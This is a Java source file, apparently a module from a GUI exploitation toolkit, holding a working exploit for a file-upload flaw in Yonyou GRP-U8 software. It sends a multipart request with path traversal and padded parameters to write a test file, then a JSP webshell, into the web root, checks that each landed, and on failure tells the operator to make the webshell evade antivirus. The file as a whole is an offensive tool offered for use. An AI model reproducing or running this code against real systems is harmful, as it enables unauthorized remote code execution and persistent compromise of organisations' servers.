package exp.oa.yongyou;

import core.Exploitlnterface;

import java.util.HashMap;

import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class yongyou_grp_UploadFileData implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url, textArea);
    }

    private Boolean att(String url, TextArea textArea) {
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "multipart/form-data");
        String post = "------WebKitFormBoundary92pUawKc\r\n" +
                "Content-Disposition: form-data; name=\"myFile\";filename=\"test.jpg\"\r\n" +
                "\r\n" +
                shell.readFile(shell.Testpath) + "\r\n" +
                "------WebKitFormBoundary92pUawKc--";

        String payload = "/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=nishizhu.txt&filename=1.jpg";
        Response post1 = HttpTools.post(url + payload, post, head, "utf-8");
        if (post1.getCode() == 200 && post1.getText().contains("parent.openWin.location.reload")) {
            Response response = HttpTools.get(url + "/R9iPortal/nishizhu.txt", new HashMap<String, String>(), "utf-8");
            if (response.getCode() == 200 && response.getText().contains(shell.test_payload)) {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                    textArea.appendText("漏洞存在 测试文件写入成功\n " + url + "/R9iPortal/nishizhu.txt");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                    textArea.appendText("GRP_U8_UploadFileData-RCE-漏洞不存在 (出现误报请联系作者)");
                });
                return false;
            }
        }
        Platform.runLater(() -> {
            textArea.appendText("\n");
            textArea.appendText("GRP_U8_UploadFileData-RCE-漏洞不存在 (出现误报请联系作者)");
        });
        return false;
    }

    private Boolean shell(String url, TextArea textArea) {
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "multipart/form-data");
        String post = "------WebKitFormBoundary92pUawKc\r\n" +
                "Content-Disposition: form-data; name=\"myFile\";filename=\"test.jpg\"\r\n" +
                "\r\n" +
                shell.readFile(shell.Jsppath) + "\r\n" +
                "------WebKitFormBoundary92pUawKc--";

        String payload = "/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=nishizhu.jsp&filename=1.jpg";
        Response post1 = HttpTools.post(url + payload, post, head, "utf-8");
        if (post1.getCode() == 200 && post1.getText().contains("parent.openWin.location.reload")) {
            Response response = HttpTools.get(url + "/R9iPortal/nishizhu.jsp", new HashMap<String, String>(), "utf-8");
            if (response.getCode() == 200 && response.getText().contains(shell.test_payload)) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 漏洞存在 webshell文件写入成功\n " + url + "/R9iPortal/nishizhu.jsp");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell被查杀 请进行免杀");
                });
                return false;
            }
        }
        Platform.runLater(() -> {
            textArea.appendText("\n webshell被查杀 请进行免杀");
        });
        return false;
    }
}
